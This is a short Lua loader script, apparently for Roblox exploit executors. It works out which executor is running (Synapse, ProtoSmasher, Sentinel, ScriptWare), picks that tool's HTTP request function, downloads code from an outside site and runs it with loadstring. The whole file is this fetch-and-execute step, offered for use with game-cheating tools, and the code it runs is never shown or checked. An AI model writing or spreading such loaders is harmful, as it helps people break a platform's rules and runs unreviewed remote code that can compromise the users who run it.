local function GetExploit()
    local Table = {}
    Table.Synapse = syn
    Table.ProtoSmasher = pebc_create
    Table.Sentinel = issentinelclosure
    Table.ScriptWare = getexecutorname

    for ExploitName, ExploitFunction in next, Table do
        if (ExploitFunction) then
            return ExploitName
        end
    end

    return "Unknown"
end

local req

local HttpFunctions = {}
HttpFunctions.Synapse = function(Value)
    req = syn.request or http_request or request or http.request
end
HttpFunctions.ProtoSmasher = function(Value)
    req = http_request or request or http.request or nil
end
HttpFunctions.Sentinel = function(Value)
    req = http_request or request or http.request or nil
end
HttpFunctions.ScriptWare = function(Value)
    req = http.request
end
HttpFunctions.Unknown = function(Value)
    req = http_request or request or http.request or nil
end

HttpFunctions[GetExploit()](req)

local url = "https://void-productions.net/getScript"
local request = req({Url = (url),Method = "GET"})

if request.Success then 
  loadstring(request.Body)()
end
